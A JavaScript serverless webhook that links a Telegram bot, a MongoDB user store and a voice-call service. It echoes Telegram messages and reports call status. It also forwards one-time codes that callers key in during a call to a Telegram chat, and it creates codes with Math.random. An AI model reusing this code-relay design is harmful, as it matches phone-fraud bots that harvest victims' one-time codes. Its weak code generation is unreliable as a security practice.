// api/webhook.js

import TelegramBot from "node-telegram-bot-api";
import mongoose from "mongoose";

export const config = {
  api: {
    bodyParser: true,
  },
};

// ================== GLOBAL CACHE ==================

let cached = global.mongo;

if (!cached) {
  cached = global.mongo = {
    conn: null,
    promise: null,
  };
}

// ================== MONGODB ==================

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI, {
      bufferCommands: false,
    });
  }

  cached.conn = await cached.promise;
  return cached.conn;
}

// ================== BOT ==================

let bot;

function getBot() {
  if (!bot) {
    if (!process.env.BOT_TOKEN) {
      throw new Error("BOT_TOKEN missing");
    }

    bot = new TelegramBot(process.env.BOT_TOKEN, {
      polling: false,
    });
  }

  return bot;
}

// ================== MODEL ==================

const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ================== HANDLER ==================

export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(200).send("OK");
    }

    await connectDB();
    const bot = getBot();
    const body = req.body;

    // ================= TELEGRAM =================

    if (body?.message) {
      const chatId = body.message.chat.id;
      const text = body.message.text;

      console.log("Message received:", text);

      try {
        if (text === "/start") {
          const response = await bot.sendMessage(
            chatId,
            "🚀 Bot is working perfectly on Vercel!"
          );
          console.log("Message sent:", response.message_id);
        } else {
          const response = await bot.sendMessage(
            chatId,
            "You said: " + text
          );
          console.log("Message sent:", response.message_id);
        }
      } catch (err) {
        console.error("SendMessage ERROR:", err.response?.body || err);
      }

      return res.status(200).send("OK");
    }

    // ================= RINGG =================

    if (body?.phone) {
      const { phone, step, intent, digits, status } = body;

      const user = await User.findOne({ phone });
      if (!user) return res.status(200).send("OK");

      if (status === "ringing") {
        await bot.sendMessage(user.chatId, "📞 Ringing...");
      }

      if (status === "picked") {
        await bot.sendMessage(user.chatId, "☎️ Call answered");
      }

      if (status === "ended") {
        await bot.sendMessage(user.chatId, "📴 Call ended");
      }

      if (step === "confirm_request" && intent === "no") {
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        user.otp = otp;
        user.status = "otp";
        await user.save();

        await bot.sendMessage(
          user.chatId,
          `🔐 Verification Code: ${otp}\n\nEnter it here in Telegram.`
        );
      }

      if (step === "otp_step" && digits) {
        await bot.sendMessage(
          user.chatId,
          `📲 OTP entered on call: ${digits}`
        );
      }

      return res.status(200).send("OK");
    }

    return res.status(200).send("OK");
  } catch (err) {
    console.error("Webhook Error:", err);
    return res.status(500).json({ error: err.message });
  }
}
